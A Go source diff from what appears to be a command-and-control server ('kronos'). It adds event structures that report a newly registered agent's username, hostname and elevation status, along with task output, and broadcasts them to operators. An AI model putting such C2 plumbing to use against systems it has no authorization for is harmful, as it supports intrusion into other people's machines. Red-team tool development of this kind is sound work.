@@ -2,14 +2,17 @@ package server
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 
+	"github.com/z3vxo/kronos/internal/broker"
 	"github.com/z3vxo/kronos/internal/byte"
 	"github.com/z3vxo/kronos/internal/database"
 )
 
 type AgentHandler struct {
-	DB *database.DB
+	DB     *database.DB
+	Broker *broker.Broker
 }
 
 func ConvertToWindowsVer(major, minor, build int16) string {
@@ -38,6 +41,25 @@ func ConvertToWindowsVer(major, minor, build int16) string {
 	}
 }
 
+type UserDetails struct {
+	CodeName   string `json:"code_name"`
+	Username   string `json:"username"`
+	HostName   string `json:"hostname"`
+	IsElevated bool   `json:"is_elevated"`
+}
+
+type DataDetails struct {
+	AgentID string `json:"agent_id"`
+	TaskID  string `json:"task_id"`
+	Output  string `json:"output"`
+}
+
+type Event struct {
+	CmdType int         `json:"type"`
+	User    UserDetails `json:"user"`
+	Data    DataDetails `json:"data"`
+}
+
 func (h *AgentHandler) HandleClientRegister(ip string, r *bytes.Reader) error {
 	Client, err := byte.ExtractRegistrationDetails(ip, r)
 	if err != nil {
@@ -52,6 +74,20 @@ func (h *AgentHandler) HandleClientRegister(ip string, r *bytes.Reader) error {
 		Client.ProcPath, ver, Client.Pid, Client.IsElev)
 	if err != nil {
 		return err
+	}
+
+	data, err := json.Marshal(Event{
+		CmdType: 1,
+		User: UserDetails{
+			CodeName: CodeName,
+			Username: Client.User,
+			HostName: Client.Host,
+		},
+		Data: DataDetails{},
+	})
+	fmt.Println("GOT HERE")
+	if err == nil {
+		h.Broker.Broadcast(string(data))
 	}
 
 	return nil
